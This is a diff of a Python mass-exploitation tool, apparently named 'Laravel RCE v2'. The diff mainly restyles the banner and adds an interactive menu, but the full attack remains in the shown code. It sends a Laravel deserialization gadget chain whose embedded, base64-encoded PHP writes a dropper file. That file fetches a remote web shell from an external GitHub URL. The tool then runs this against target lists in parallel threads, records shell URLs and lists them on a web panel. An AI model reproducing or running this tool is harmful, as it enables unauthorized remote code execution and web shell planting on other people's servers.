@@ -1,6 +1,5 @@
-import hmac, hashlib, json, requests, re, threading, sys, os
+import hmac, hashlib, json, requests, re, threading, sys, os, urllib3
 import base64
-import urllib3
 from hashlib import sha256
 from base64 import b64decode, b64encode
 from Crypto import Random
@@ -9,10 +8,8 @@ from queue import Queue
 from threading import Thread
 from flask import Flask, jsonify
 
-# Disable HTTPS warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Flask App
 shells_found = []
 app = Flask(__name__)
 
@@ -20,21 +17,17 @@ app = Flask(__name__)
 def list_shells():
     return jsonify(shells_found)
 
-# ASCII Art Banner
 def print_banner():
-    banner = r"""
-   _____                           _       
-  / ____|                         | |      
- | (___   ___  ___ _   _ __ __ _| |_ ___ 
-  \___ \ / _ \/ __| | | | '__/ _` | __/ _ \
-  ____) |  __/ (__| |_| | | | (_| | ||  __/
- |_____/ \___|\___|\__,_|_|  \__,_|\__\___|
+    print("""
+\033[95m  _________                            __                 
+ /   _____/__ __  ____   ____   _______/  |_  ___________ 
+ \_____  \|  |  \/    \ /    \ /  ___/\   __\/ __ \_  __ \\
+ /        \  |  /   |  \   |  \\\\___ \  |  | \  ___/|  | \/
+/_______  /____/|___|  /___|  /____  > |__|  \___  >__|   
+        \/           \/     \/     \/            \/       
+\033[92m          Sean - Laravel RCE v2
+\033[0m""")
 
-            Sean - Laravel RCE v2
-    """
-    print(banner)
-
-# Payload configuration
 pathname = 'pler.php'
 p = '<?php $root = $_SERVER["DOCUMENT_ROOT"];$myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!");$code = "PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaW50eHBsb2l0L21pbmlzaGVsbC9tYWluL3BsZXIudHh0JywgYmFzZW5hbWUoX19GSUxFX18pKSkgewoJaGVhZGVyKCdMb2NhdGlvbjogJy4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7Cn0gZWxzZSB7CgllY2hvICJVbmtub3duIGVycm9yPGJyPiI7Cn0KPz4=";fwrite($myfile, base64_decode($code));fclose($myfile);echo("Chitoge kirisaki?! Tsundere,kawaii <3");'
 exploit_code = 'O:29:"Illuminate\\Support\\MessageBag":2:{s:11:"\x00*\x00messages";a:0:{}s:9:"\x00*\x00format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\x00*\x00queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"\x00*\x00event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"\x00*\x00config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"\x00*\x00name";s:7:"abcdefg";}s:7:"\x00*\x00code";s:'+str(len(p))+':"'+p+'";}}}}'
@@ -120,36 +113,55 @@ def exploit(url):
                     shells_found.append({"target": url, "shell_url": shell_url})
                     with open('shell_results.txt', 'a') as f:
                         f.write(shell_url + '\n')
-                    print(f"[+] Success: {shell_url}")
+                    print(f"\033[92m[+] Success: {shell_url}\033[0m")
                 else:
-                    print(f"[-] Failed to confirm shell: {url}")
+                    print(f"\033[91m[-] Failed to confirm shell: {url}\033[0m")
             else:
-                print(f"[-] Cannot get APP_KEY: {url}")
+                print(f"\033[91m[-] Cannot get APP_KEY: {url}\033[0m")
         else:
-            print(f"[-] Not vulnerable: {url}")
+            print(f"\033[91m[-] Not vulnerable: {url}\033[0m")
     except Exception as e:
-        print(f"[!] Error on {url}: {e}")
+        print(f"\033[91m[!] Error on {url}: {e}\033[0m")
 
 if __name__ == "__main__":
-    if len(sys.argv) == 2 and sys.argv[1] == 'panel':
-        app.run(debug=True)
-    elif len(sys.argv) < 3:
-        print("Usage:\n  python3 script.py check [url]\n  python3 script.py [list.txt] [threads]\n  python3 script.py panel  # to run web panel")
-        sys.exit()
+    print_banner()
 
-    print_banner()  # Banner ditampilkan di sini
+    print("1. Mass Exploit")
+    print("2. Single Check")
+    print("3. Web Panel")
+    print("0. Exit")
+    choice = input("\nChoose option: ").strip()
 
-    mode = sys.argv[1]
-    if mode == "check":
-        exploit(sys.argv[2])
-    else:
-        filename = mode
-        thread_num = int(sys.argv[2])
-        pool = ThreadPool(thread_num)
+    if choice == '1':
+        filename = input("Enter target list filename (e.g. list.txt): ").strip()
+        if not os.path.exists(filename):
+            print("\033[91m[-] File not found!\033[0m")
+            sys.exit()
+        try:
+            thread_num = int(input("Enter number of threads (e.g. 10): ").strip())
+        except:
+            print("\033[91m[-] Invalid thread number.\033[0m")
+            sys.exit()
+
         with open(filename) as f:
-            urls = f.read().splitlines()
+            urls = list(set(f.read().splitlines()))  # Remove duplicates
+
+        pool = ThreadPool(thread_num)
         for url in urls:
             if not url.startswith("http"):
                 url = "http://" + url
             pool.add_task(exploit, url)
         pool.wait_completion()
+
+    elif choice == '2':
+        target = input("Enter single URL to check: ").strip()
+        if not target.startswith("http"):
+            target = "http://" + target
+        exploit(target)
+
+    elif choice == '3':
+        print("Running panel on http://127.0.0.1:5000")
+        app.run(debug=True)
+
+    else:
+        print("Bye!")
